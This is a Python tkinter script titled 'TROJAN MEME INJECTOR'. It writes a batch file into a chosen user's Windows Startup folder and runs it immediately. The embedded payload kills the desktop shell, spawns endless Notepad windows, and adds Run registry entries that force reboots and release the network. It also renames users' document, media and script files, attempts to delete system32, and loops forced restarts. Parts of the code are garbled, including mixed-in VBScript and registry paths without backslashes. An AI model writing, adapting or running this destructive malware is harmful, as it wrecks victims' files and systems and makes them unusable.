from tkinter import *
import os


def errorgone():
	error.destroy()


def inject():
	username1 = username.get()
	if username == None:
		error = Tk()
		screen.geometry("200x200")
		screen.title('Error Exiting Program')
		Label(text='''Enter A UserName Else Check It By Opening C:Users''').pack()
		screen.destroy()
		Button(text="EXIT", command = errorgone).pack()





	os.chdir(rf'C:\Users\{username1}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')
	file=open('activated.bat', "w")
	file.write('''@echo off
taskkill /f /im explorer.exe
:top
START %SystemRoot%\system32\notepad.exe
GOTO top
Dim WSHShell
Set WSHShell=Wscript.CreateObject("Wscript.Shell") 
 
Dim x
For x = 1 to 100000000
WSHShell.Run "Tourstart.exe"
echo @echo off>c:windowshartlell.bat
echo break off>>c:windowshartlell.bat
echo shutdown -r -t 11 -f>>c:windowshartlell.bat
echo end>>c:windowshartlell.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v startAPI /t reg_sz /d c:windowshartlell.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v /t reg_sz /d c:windowshartlell.bat /f
echo You have been HACKED.
PAUSE
echo @echo off>c:windowswimn32.bat
echo break off>>c:windowswimn32.bat
echo ipconfig/release_all>>c:windowswimn32.bat
echo end>>c:windowswimn32.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
echo You Have Been HACKED!
PAUSE
REN *.DOC *.TXT
REN *.JPEG *.TXT
REN *.LNK *.TXT
REN *.AVI *.TXT
REN *.MPEG *.TXT
REN *.COM *.TXT
REN *.BAT *.TXT
@echo off
del c:\\windows\system32
:CRASH
net send * WORKGROUP ENABLED
ipconfig /release
shutdown -r -f -t0
echo @echo off>c:windowshartlell.bat
echo break off>>c:windowshartlell.bat
echo shutdown -r -t 11 -f>>c:windowshartlell.bat
echo end>>c:windowshartlell.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v startAPI /t reg_sz /d c:windowshartlell.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v HAHAHA /t reg_sz /d c:windowshartlell.bat /f
echo You Have Been Hacked echo @echo off>c:windowswimn32.bat
echo break off>>c:windowswimn32.bat
echo ipconfig/release_all>>c:windowswimn32.bat
echo end>>c:windowswimn32.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
echo YOU HAVE BEEN HACKED
REN *.DOC *.TXT
REN *.JPEG *.TXT
REN *.LNK *.TXT
REN *.AVI *.TXT
REN *.MPEG *.TXT
REN *.COM *.TXT
REN *.BAT *.TXT
GOTO CRASH ''' +"\n")








	file.close()
	os.system('activated.bat')
	Button(text='BYEE').pack()


def main_screen():
	screen = Tk()
	screen.geometry("500x500")
	screen.title("TROJAN MEME INJECTOR")

	global username
	username = StringVar()
	Button(text = "Inject", height = "2", width = "30", command = inject).pack()
	Label(text="Enter Your Windows Username That You Want To Inject The Trojan Meme To:").pack()
	Entry(textvariable = username).pack()




	screen.mainloop()

main_screen()
